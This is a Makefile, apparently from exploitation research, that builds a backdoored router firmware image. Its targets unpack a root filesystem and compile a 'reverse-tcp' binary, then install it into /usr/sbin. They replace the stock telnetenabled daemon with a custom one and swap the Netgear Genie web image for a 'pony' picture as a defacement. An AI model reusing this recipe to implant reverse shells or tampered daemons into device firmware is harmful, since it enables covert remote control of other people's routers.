# Copyright (c) 2015
# - Zachary Cutlip <uid000()gmail.com>
# 
# See LICENSE for more details.
# 

rtcp-src=./rtcp

RTCP=reverse-tcp



reverse-tcp:
	make -C $(rtcp-src) $@
	cp $(rtcp-src)/$(RTCP) ./

.rootfs.stamp:rootfs.tar.gz
	tar zxf $<
	touch $@

.pony.stamp:pony.png .rootfs.stamp
	-rm -f rootfs/www/img/Netgeargenie.png
	install -m 0644 pony.png rootfs/www/img/Netgeargenie.png
	touch $@
	
.telnetenabled.stamp: telnetenabled .rootfs.stamp
	mv rootfs/usr/sbin/telnetenabled \
	 rootfs/usr/sbin/telnetenabled.disabled
	
	install -m 0755 telnetenabled \
	 rootfs/usr/sbin/telnetenabled
	
	touch $@

install:.install.stamp
	

.install.stamp: $(RTCP) .telnetenabled.stamp .pony.stamp
	install -m 0755 $(RTCP) rootfs/usr/sbin/$(RTCP)
	touch .install.stamp

clean:
	-rm $(RTCP)
	make -C $(rtcp-src) $@
	rm -rf rootfs
	rm -rf .*stamp

bare: clean
	-rm -f rootfs.tar.gz
